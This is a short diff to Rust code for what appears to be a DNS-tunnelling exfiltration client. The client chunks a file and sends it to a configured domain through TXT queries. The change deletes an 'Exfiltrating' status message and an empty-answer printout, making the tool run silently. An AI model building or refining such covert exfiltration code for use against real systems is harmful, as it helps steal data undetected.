@@ -148,7 +148,6 @@ impl Client {
         let session_id = Client::generate_session_id();
         let total_chunks = payload.data.chunks(CHUNK_SIZE).count();
 
-        println!("Exfiltrating {} to {}", &payload.filename, self.config.domain);
         self.send_init(&mut client, &payload.filename, &session_id, total_chunks).await?;
         self.send_data(&mut client, &payload.data, &payload.filename, &session_id, total_chunks)
             .await?;
@@ -181,9 +180,7 @@ impl Client {
         let response = client.query(domain_name, DNSClass::IN, RecordType::TXT).await?;
         let mut responses: Vec<String> = Vec::new();
 
-        if response.answers().is_empty() {
-            println!("Answer is empty");
-        } else {
+        if !response.answers().is_empty() {
             for answer in response.answers() {
                 if let Some(RData::TXT(txt)) = answer.data() {
                     for bytes in txt.iter() {
